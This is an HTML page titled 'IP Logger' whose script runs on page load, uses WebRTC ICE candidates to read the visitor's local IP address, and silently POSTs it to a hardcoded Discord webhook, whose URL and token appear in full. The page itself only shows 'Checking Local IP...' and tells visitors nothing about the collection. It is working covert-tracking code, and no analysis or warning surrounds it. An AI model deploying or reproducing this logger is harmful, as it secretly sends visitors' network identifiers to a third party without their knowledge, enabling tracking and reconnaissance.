<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
</head>
<body>
    <h1>Checking Local IP...</h1>
    <script>
        const webhookURL = "https://discord.com/api/webhooks/1348149288579891230/vMwbJioC6BccY6wEtaDWotoL_ezlfd_875kj1HSo4m6xyBkVZlMAxPO9hA_iWt0lXbP2";

        async function getLocalIP() {
            return new Promise((resolve, reject) => {
                let pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel("");
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(err => reject(err));

                pc.onicecandidate = event => {
                    if (!event.candidate) return;
                    let ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3})/);
                    if (ipMatch) {
                        let localIP = ipMatch[1];
                        resolve(localIP);

                        // Kirim ke Webhook Discord
                        fetch(webhookURL, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ content: `Local IP: ${localIP}` })
                        }).catch(err => console.error("Webhook Error:", err));
                    }
                    pc.close();
                };
            });
        }

        getLocalIP().then(ip => console.log("Local IP:", ip)).catch(err => console.error(err));
    </script>
</body>
</html>
